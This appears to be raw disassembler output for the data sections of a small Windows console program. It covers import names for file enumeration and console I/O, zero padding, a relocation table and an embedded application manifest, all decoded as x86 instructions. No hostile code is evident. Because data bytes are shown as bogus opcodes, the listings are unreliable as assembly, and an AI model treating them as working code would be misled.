add    %al,(%eax)
add    %ch,(%eax)
add    %al,(%eax)
clc    
sub    %al,(%eax)
add    %dl,%al
daa    
add    %al,(%eax)
ret    $0x27
add    %bh,-0x53ffffd9(%edx)
daa    
add    %al,(%eax)
movsb  %ds:(%esi),%es:(%edi)
daa    
add    %al,(%eax)
lcall  $0x27,$0x88000027
add    %bh,0x27(%edx)
add    %al,(%eax)
bound  %esp,(%edi)
add    %al,(%eax)
pop    %eax
daa    
add    %al,(%eax)
dec    %esi
daa    
add    %al,(%eax)
ds daa 
add    %al,(%eax)
mov    $0x28,%al
add    %al,(%eax)
push   $0x2c
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
out    %al,$0x1
inc    %edi
gs je  0x402726
popa   
jae    0x402751
inc    %ebp
jb     0x402752
outsl  %ds:(%esi),(%dx)
jb     0x4026e3
add    %ah,(%ecx,%eax,1)
inc    %esi
imul   $0x73726946,0x64(%esi),%ebp
je     0x402736
imul   $0x1300000,0x57(%ebp,%eiz,2),%ebp

inc    %esi
imul   $0x7478654e,0x64(%esi),%ebp
inc    %esi
imul   $0x46011900,0x57(%ebp,%eiz,2),%ebp

imul   $0x736f6c43,0x64(%esi),%ebp
add    %cl,%gs:0x45(%ebx)
push   %edx
dec    %esi
inc    %ebp
dec    %esp
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
pop    %edi
add    %eax,0x65(%edi)
je     0x40277b
jae    0x40278d
jb     0x402778
popa   
insl   (%dx),%es:(%edi)
gs push %edi
add    %al,(%eax)
inc    %ecx
inc    %esp
push   %esi
inc    %ecx
push   %eax
dec    %ecx
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
pop    %ds
add    %bh,(%edi)
aas    
pop    %edi
push   %ebp
inc    %eax
pop    %ecx
inc    %ecx
push   %eax
inc    %ecx
pop    %eax
dec    %ecx
inc    %eax
pop    %edx
add    %ch,(%esi)
add    $0x6e697270,%eax
je     0x4027bc
add    %al,(%eax)
cmpsb  %es:(%edi),%ds:(%esi)
add    $0x69727077,%eax
outsb  %ds:(%esi),(%dx)
je     0x4027c7
add    %bl,0x73637705(%edi)
je     0x4027d8
insl   (%dx),%es:(%edi)
bound  %esi,0x0(%ebx)
add    %cl,0x53(%ebp)
push   %esi
inc    %ebx
push   %edx
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %dl,0x6d615f01
jae    0x4027e8
pop    %edi
gs js  0x4027ee
je     0x402787
add    %dh,%bh
add    %bl,0x5f(%edi)
ja     0x4027f5
gs je  0x4027fe
popa   
imul   $0x736772,0x61(%esi),%ebp
add    %ch,(%ecx,%eax,1)
pop    %edi
arpl   %sp,0x78(%ebp)
imul   $0x655f017c,0x0(%eax,%eax,1),%esi

js     0x402813
je     0x4027ac
data16 add %bl,0x58(%edi)
arpl   %si,0x74(%eax)
inc    %esi
imul   $0x4cc0072,0x65(%esp,%esi,2),%ebp

gs js  0x402828
je     0x4027c1
add    %bh,%al
add    %bl,0x5f(%edi)
ja     0x402831
outsb  %ds:(%esi),(%dx)
imul   $0x4000076,0x6e(%ebp,%eiz,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x5006d72,0x65(%esp,%esi,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x655f6d72,0x65(%esp,%esi,2),%esi

add    %bh,(%ecx,%eax,1)
pop    %edi
arpl   %bp,0x6e(%edi)
imul   $0x7268,0x74(%edi),%sp
gs popa 
fs insb (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x6c(%ecx)
gs add %ah,%bl
add    %bl,0x5f(%edi)
jae    0x40286b
je     0x40287d
jae    0x40286f
jb     0x402879
popa   
je     0x402877
gs jb  0x402884
add    %al,(%eax)
or     (%ecx),%eax
pop    %edi
popa   
fs push $0x75
jae    0x402891
pop    %edi
imul   $0xcb00,%fs:0x0(%esi),%si
add    %bl,0x5f(%edi)
jo     0x402889
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
iret   
add    %bl,0x5f(%edi)
jo     0x402899
pop    %edi
insw   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
push   $0x1
pop    %edi
outsb  %gs:(%esi),(%dx)
arpl   %bp,0x64(%edi)
gs pop %edi
jo     0x4028bd
imul   $0xe0007265,0x74(%esi),%ebp
add    %bl,0x5f(%edi)
jae    0x4028bf
je     0x4028bb
popa   
jo     0x4028cf
pop    %edi
je     0x4028db
jo     0x4028c9
add    %al,(%eax)
dec    %ebx
add    %ebx,0x63(%edi)
jb     0x4028e0
pop    %edi
fs bound %esi,%gs:0x67(%ebp)
addr16 gs jb 0x4028d5
push   $0x6b6f6f
add    %al,0x0(%ebx)
aas    
je     0x4028e6
jb     0x4028f0
imul   $0x40406574,0x61(%esi),%ebp
pop    %ecx
inc    %ecx
pop    %eax
pop    %eax
pop    %edx
add    %ah,%dh
add    0x75(%edi),%ebx
outsb  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
xchg   %eax,%esi
add    %bl,0x5f(%edi)
fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x40290f
je     0x4028a8
jbe    0x4028ac
pop    %edi
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
sbb    $0x3,%al
pop    %edi
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x402921
je     0x4028ba
pusha  
add    %ebx,0x64(%edi)
arpl   %bp,%gs:0x64(%edi)
gs pop %edi
jo     0x402935
imul   $0x73007265,0x74(%esi),%ebp
add    %ebx,0x65(%edi)
js     0x402935
gs jo  0x402949
pop    %edi
push   $0x6c646e61
gs jb  0x402912
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %cl,(%ebx)
add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
jbe    0x40295c
imul   $0x77,0x5f(%ebp),%esp
popa   
je     0x402967
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %al,(%eax)
aas    
add    %ebx,0x63(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
je     0x402972
outsl  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
data16 jo 0x402964
jae    0x402907
add    %ah,0x6(%ebx)
aas    
arpl   %bp,0x73(%edi,%ebp,2)
gs inc %eax
aas    
and    $0x62,%al
popa   
jae    0x402980
arpl   %bx,0x6f(%edi)
data16 jae 0x402991
jb     0x402984
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x40298f
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4029b0
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %cl,0x1(%edi)
aas    
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x4029ba
arpl   %bx,0x6f(%edi)
data16 jae 0x4029cb
jb     0x4029be
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x4029c9
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4029ea
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
inc    %esp
dec    %eax
dec    %eax
inc    %eax
pop    %edx
add    %al,(%eax)
pusha  
push   %es
aas    
arpl   %bp,0x73(%edi,%ebp,2)
gs inc %eax
aas    
and    $0x62,%al
popa   
jae    0x4029fe
arpl   %bx,0x69(%edi)
data16 jae 0x402a0f
jb     0x402a02
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402a0d
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402a2e
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %ch,(%eax)
add    %edi,(%edi)
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x402a38
arpl   %bx,0x69(%edi)
data16 jae 0x402a49
jb     0x402a3c
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402a47
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402a68
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
inc    %esp
dec    %eax
dec    %eax
inc    %eax
pop    %edx
add    %al,(%eax)
inc    %ebp
or     %bh,(%edi)
addr16 gs je 0x402a4b
aas    
and    $0x62,%al
popa   
jae    0x402a7a
arpl   %bx,0x69(%edi)
jae    0x402a8a
jb     0x402a7d
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402a88
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402aa9
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
dec    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
xor    %cl,(%eax)
aas    
data16 insb (%dx),%es:(%edi)
jne    0x402aba
push   $0x62243f40
popa   
jae    0x402ab8
arpl   %bx,0x6f(%edi)
jae    0x402ac8
jb     0x402abb
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402ac6
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402ae7
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
pop    %eax
pop    %edx
add    %bl,0xa(%ebx)
aas    
jo     0x402afc
je     0x402ac9
aas    
and    $0x62,%al
popa   
jae    0x402af8
arpl   %bx,0x6f(%edi)
jae    0x402b08
jb     0x402afb
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402b06
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402b27
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
inc    %esp
inc    %eax
pop    %edx
add    %al,(%eax)
add    $0x5f3f3f04,%eax
inc    %esp
aas    
and    $0x62,%al
popa   
jae    0x402b39
arpl   %bx,0x6f(%edi)
data16 jae 0x402b4a
jb     0x402b3d
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402b48
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402b69
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
stc    
add    (%edi),%edi
aas    
pop    %edi
inc    %esp
aas    
and    $0x62,%al
popa   
jae    0x402b75
arpl   %bx,0x69(%edi)
data16 jae 0x402b86
jb     0x402b79
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402b84
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402ba5
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
dec    %ebp
push   %ebx
push   %esi
inc    %ebx
push   %eax
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %bh,0x746e4902(%ebp)
gs jb  0x402bbc
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebp
js     0x402bbb
push   $0x65676e61
add    %ah,(%ecx)
add    $0x53,%al
insb   (%dx),%es:(%edi)
gs gs jo 0x402b66
mov    $0x746e4902,%edx
gs jb  0x402bda
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebx
outsl  %ds:(%esi),(%dx)
insl   (%dx),%es:(%edi)
jo     0x402bd9
jb     0x402bdf
inc    %ebp
js     0x402be0
push   $0x65676e61
add    %al,(%eax)
sub    $0x72655404,%eax
insl   (%dx),%es:(%edi)
imul   $0x72506574,0x61(%esi),%ebp
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x402b97
add    %ch,0x74654701(%ecx)
inc    %ebx
jne    0x402c12
jb     0x402c07
outsb  %ds:(%esi),(%dx)
je     0x402bf5
jb     0x402c16
arpl   %sp,0x73(%ebp)
jae    0x402bac
ds add $0x55,%al
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402c1d
gs jo  0x402c31
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x402bc7
add    %dl,0x74655304
push   %ebp
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402c3c
gs jo  0x402c50
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x402be6
roll   (%edx)
dec    %ecx
jae    0x402c2f
bound  %esi,%gs:0x67(%ebp)
addr16 gs jb 0x402c43
jb     0x402c5a
jae    0x402c5c
outsb  %ds:(%esi),(%dx)
je     0x402bfa
push   %esp
add    0x75(%ecx),%edx
gs jb  0x402c7a
push   %eax
gs jb  0x402c6b
outsl  %ds:(%esi),(%dx)
jb     0x402c75
popa   
outsb  %ds:(%esi),(%dx)
arpl   %sp,0x43(%ebp)
outsl  %ds:(%esi),(%dx)
jne    0x402c7e
je     0x402c77
jb     0x402c14
data16 add 0x65(%edi),%al
je     0x402c6e
imul   $0x6e756f43,0x6b(%ebx),%esp
je     0x402c23
add    %ch,0x74654701(%ebp)
inc    %ebx
jne    0x402c9e
jb     0x402c93
outsb  %ds:(%esi),(%dx)
je     0x402c85
push   $0x64616572
dec    %ecx
add    %al,%fs:(%eax)
stos   %al,%es:(%edi)
add    %eax,0x65(%edi)
je     0x402c83
jne    0x402cb4
jb     0x402ca9
outsb  %ds:(%esi),(%dx)
je     0x402c97
jb     0x402cb8
arpl   %sp,0x73(%ebp)
jae    0x402c97
add    %cl,%fs:0x2(%edi)
inc    %edi
gs je  0x402ca9
jns    0x402ccb
je     0x402cbf
insl   (%dx),%es:(%edi)
push   %esp
imul   $0x69467341,0x65(%ebp),%ebp
insb   (%dx),%es:(%edi)
gs push %esp
imul   $0x5f007300,0x65(%ebp),%ebp
pop    %edi
inc    %ebx
js     0x402ce9
inc    %esi
jb     0x402cd5
insl   (%dx),%es:(%edi)
gs dec %eax
popa   
outsb  %ds:(%esi),(%dx)
fs insb (%dx),%es:(%edi)
gs jb  0x402cb1
add    %al,(%eax)




dec    %esi
out    %al,$0x40
mov    $0x44bf19b1,%ebx
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
incl   (%ecx)
add    %al,(%eax)
add    %al,0x40(%ecx,%eiz,1)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0x0




add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
sbb    %al,(%eax)
add    %al,(%eax)
sbb    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
xor    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
or     %eax,(%eax,%eax,1)
add    %cl,0x0(%eax)
add    %al,(%eax)
pop    %eax
inc    %eax
add    %al,(%eax)
push   %esi
add    (%eax),%al
add    %ah,%ah
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %bh,(%ecx,%eiz,2)
jae    0x4040cf
gs insl (%dx),%es:(%edi)
bound  %ebp,0x20(%ecx,%edi,2)
js     0x4040d1
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040a5
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x4040eb
data16 je 0x4040ac
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x4040ba
and    (%eax),%ah
insl   (%dx),%es:(%edi)
popa   
outsb  %ds:(%esi),(%dx)
imul   $0x65567473,0x65(%esi),%esp
jb     0x40410a
imul   $0x2e31223d,0x6e(%edi),%ebp
xor    %ah,(%edx)
ds or  $0x3c20200a,%eax
je     0x40411a
jne    0x40411d
je     0x4040f5
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
and    %bh,0x6d(%eax)
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040f3
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x404139
data16 je 0x4040fa
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x40410a
and    (%esi),%bh
or     $0x2020200a,%eax
and    %bh,(%ebx,%esi,2)
arpl   %si,%gs:0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

and    %ah,(%eax)
and    %ah,(%eax)
cmp    $0x72,%al
gs jno 0x40416b
gs jae 0x40416d
gs fs push %eax
jb     0x404167
jbe    0x404169
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x404144
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %ah,(%eax)
and    %bh,(%edx,%esi,2)
gs jno 0x40418a
gs jae 0x40418c
gs fs inc %ebp
js     0x404182
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
and    %ch,0x76(%ebp,%eiz,2)
gs insb (%dx),%es:(%edi)
cmp    $0x49736122,%eax
outsb  %ds:(%esi),(%dx)
jbe    0x4041a5
imul   $0x22,0x72(%ebp),%esp
and    %dh,0x69(%ebp)
inc    %ecx
arpl   %sp,0x65(%ebx)
jae    0x4041b6
cmp    $0x6c616622,%eax
jae    0x4041af
and    (%esi),%bh
cmp    $0x2f,%al
jb     0x4041b5
jno    0x4041c7
gs jae 0x4041c9
gs fs inc %ebp
js     0x4041bf
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
ds or  $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%edi,%ebp,1)
jb     0x4041d7
jno    0x4041e9
gs jae 0x4041eb
gs fs push %eax
jb     0x4041e5
jbe    0x4041e7
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x4041c2
or     $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
jae    0x4041f3
arpl   %si,0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

cmp    $0x2f,%al
je     0x40420f
jne    0x404212
je     0x4041ea
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
ds or  $0x3c20200a,%eax
fs gs jo 0x404213
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x2020200a,%eax
and    %bh,(%esp,%eiz,2)
gs jo  0x404225
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x404207
jae    0x40423b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%ecx,%eiz,2)
jae    0x40424d
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x40424e
je     0x404260
and    %dh,0x70(%ecx,%edi,2)
gs cmp $0x6e697722,%eax
xor    (%edx),%esi
and    (%eax),%ah
outsb  %ds:(%esi),(%dx)
popa   
insl   (%dx),%es:(%edi)
gs cmp $0x63694d22,%eax
jb     0x40426f
jae    0x404271
data16 je 0x404233
push   %esi
inc    %ebx
cmp    %esi,(%eax)
cs inc %ebx
push   %edx
push   %esp
and    (%eax),%ah
jbe    0x404276
jb     0x404286
imul   $0x2e39223d,0x6e(%edi),%ebp
xor    %ch,(%esi)
xor    (%ecx),%dh
xor    %dh,(%edx)
xor    (%esi),%ch
cmp    %ah,(%edx)
and    %dh,0x72(%eax)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x40429c
jb     0x404270
jb     0x404294
push   $0x63657469
je     0x4042ad
jb     0x40429f
cmp    $0x36387822,%eax
and    (%eax),%ah
jo     0x4042b8
bound  %ebp,0x63(%ecx,%ebp,2)
dec    %ebx
gs jns 0x40429f
outsl  %ds:(%esi),(%dx)
imul   $0x3d,0x6e(%ebp),%esp
and    (%ecx),%dh
data16 arpl %di,(%eax)
bound  %esi,(%ebx)
bound  %edi,(%ecx)
popa   
xor    %esp,0x31(%ebp)
cmp    %ah,0x33(%ebp)
bound  %esp,(%edx)
ds cmp $0x2f,%al
popa   
jae    0x4042db
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x4042dc
je     0x4042ee
ds or  $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
fs gs jo 0x4042e7
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x4042c9
jae    0x4042fd
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x3c20200a,%eax
das    
fs gs jo 0x4042ff
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x612f3c0a,%eax
jae    0x40431b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
push   %eax
inc    %ecx




add    %dl,(%eax)
add    %al,(%eax)
mov    %al,(%ecx)
add    %al,(%eax)
jne    0x40503a
xorl   $0xffffff8b,(%eax)
xor    %ah,-0x44cf4ad0(%ebp)
xor    %cl,%bh
xor    %ch,%ch
xor    %bh,%bh
xor    %al,0x2c311c31
xor    %edi,(%ecx,%esi,1)
dec    %ecx
xor    %edi,0x31(%eax)
test   %dh,(%ecx)
nop
xor    %edx,-0x7ce55cf(%ebp)
xor    %edi,%esi
xor    %ecx,(%edx)
xor    (%eax),%dl
xor    0x32(%ebx),%bl
je     0x40506c
test   %dh,(%edx)
mov    (%edx),%dh
xchg   %eax,%ebp
xor    0x4e32b432(%esi),%ch
xor    -0x3ecc48cd(%edx),%esp
xor    %edi,%eax
xor    %esp,%edx
xor    (%esp,%esi,1),%esp
sub    $0x42343334,%eax
xor    $0x48,%al
xor    $0x75,%al
xor    $0xdf,%al
xor    $0xeb,%al
xor    $0x1d,%al
xor    $0x354d352c,%eax
pop    %esp
